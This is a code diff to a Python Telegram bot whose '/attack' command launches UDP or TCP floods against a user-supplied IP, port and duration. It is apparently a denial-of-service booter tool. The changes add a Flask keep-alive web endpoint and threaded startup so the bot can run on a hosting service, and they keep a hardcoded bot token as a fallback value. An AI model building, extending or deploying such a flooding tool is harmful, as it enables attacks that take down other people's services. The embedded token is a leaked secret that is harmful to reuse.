@@ -4,11 +4,18 @@ import random
 import time
 import telebot
 import json
+import os
+from flask import Flask, jsonify
 
 total_sent = 0
 count_lock = threading.Lock()
-TOKEN = '8186042947:AAH3yFUwAjhWSqHLBYzvJhNxb4LGap9Eap0'
+TOKEN = os.environ.get('TOKEN', '8186042947:AAH3yFUwAjhWSqHLBYzvJhNxb4LGap9Eap0')
 bot = telebot.TeleBot(TOKEN)
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return jsonify({"message": "Bot đang hoạt động!"})
 
 def send_udp(ip, port, dur):
     global total_sent
@@ -90,7 +97,7 @@ def attack_command(message):
             bot.reply_to(message, "Usage: /attack [ip] [port] [mode: udp/tcp] [seconds]")
             return
         ip, port, mode, seconds = args
-        port = int(port)
+        port = int(port) if port else 80
         seconds = int(seconds)
         if mode not in ["udp", "tcp"]:
             bot.reply_to(message, "Mode must be 'udp' or 'tcp'")
@@ -100,4 +107,16 @@ def attack_command(message):
     except Exception as e:
         bot.reply_to(message, f"Error: {str(e)}")
 
-bot.polling()
+def run_bot():
+    bot.polling()
+
+def run_flask():
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
+
+if __name__ == '__main__':
+    flask_thread = threading.Thread(target=run_flask, daemon=True)
+    bot_thread = threading.Thread(target=run_bot, daemon=True)
+    flask_thread.start()
+    bot_thread.start()
+    flask_thread.join()
+    bot_thread.join()
